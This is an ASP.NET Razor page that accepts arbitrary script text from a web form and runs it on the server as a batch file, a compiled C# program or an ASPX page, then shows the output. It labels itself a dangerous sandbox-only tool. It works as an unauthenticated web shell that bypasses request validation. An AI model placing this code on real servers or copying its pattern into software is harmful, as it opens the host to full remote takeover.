@using System.CodeDom.Compiler;
@using System.Diagnostics;
@using System.Reflection;
@using System.Web.Compilation;

@functions {
    string ExecuteBatchFile(string script)
    {
        string path = Server.MapPath("~/script.cmd");
        File.WriteAllText(path, script);

        return ExecuteCommand("cmd.exe", "/c script.cmd");
    }

    string ExecuteConsoleApp(string script)
    {
        string path = Server.MapPath("~/app.cs");
        File.WriteAllText(path, script);

        string[] referencedAssemblies = BuildManager.GetReferencedAssemblies().OfType<Assembly>().Select(a => a.Location).ToArray();
        var provider = new Microsoft.CSharp.CSharpCodeProvider();
        CompilerResults results = provider.CompileAssemblyFromFile(
            new CompilerParameters(referencedAssemblies) {
                GenerateExecutable = true,
                OutputAssembly = Path.ChangeExtension(path, ".exe")
            },
            path);
        
        if (results.Errors.HasErrors)
        {
            return results.Errors[0].ToString();
        }

        string output = ExecuteCommand(results.PathToAssembly);
        File.Delete(results.PathToAssembly);

        return output;
    }

    string ExecutePage(string script)
    {
        string path = Server.MapPath("~/page.aspx");
        File.WriteAllText(path, script);

        // TODO: capture the output instead of having it go straight to the response
        Server.Execute("~/page.aspx");

        return "";
    }

    string ExecuteCommand(string command, string arguments = null)
    {
        var output = new System.Text.StringBuilder();

        var process = new Process();

        var startInfo = new ProcessStartInfo
        {
            FileName = command,
            Arguments = arguments,
            WorkingDirectory = HttpRuntime.AppDomainAppPath,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false
        };

        process.StartInfo = startInfo;

        process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
        process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        process.WaitForExit();

        return output.ToString();
    }
}

@{
    string script = Request.Unvalidated("script");
    string output = String.Empty;
    
    if (String.IsNullOrEmpty(script))
    {
        script = @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(""Hello world!"");
        }
    }
}
";
    }
    else
    {
        switch (Request.Form["execute"])
        {
            case "Run batch":
                output = ExecuteBatchFile(script);
                break;
            case "Run console":
                output = ExecuteConsoleApp(script);
                break;
            default:
                output = ExecutePage(script);
                break;
        }
    }
}

<h2>Executes arbitrary scripts on server. Super dangerous; use only in controlled sandboxed environments! </h2>

<form action="." method="post">
    <textarea cols="80" rows="20" name="script">@script</textarea><br />
    <input type="submit" value="Run batch" name="execute">
    <input type="submit" value="Run console" name="execute">
    <input type="submit" value="Run page" name="execute">
</form>

<h2>Output</h2>
<pre>
@output
</pre>